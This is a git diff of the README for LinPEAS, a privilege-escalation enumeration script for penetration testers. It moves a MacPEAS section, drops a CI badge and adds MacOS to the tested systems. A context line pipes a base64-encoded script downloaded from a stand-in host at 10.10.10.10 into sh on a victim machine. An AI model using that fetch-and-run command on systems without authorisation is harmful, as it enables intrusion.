@@ -1,5 +1,4 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script 
-[![CI-master_test](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml/badge.svg)](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml)
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
@@ -9,6 +8,9 @@ Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks
 
 [![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)
 
+## MacPEAS
+
+Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**
 
 ## Quick Start
 ```bash
@@ -49,13 +51,9 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
-## MacPEAS
-
-Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
-
 ## Basic Information
 
-The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD and OpenBSD).
+The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD, OpenBSD and MacOS).
 
 This script doesn't have any dependency.
 
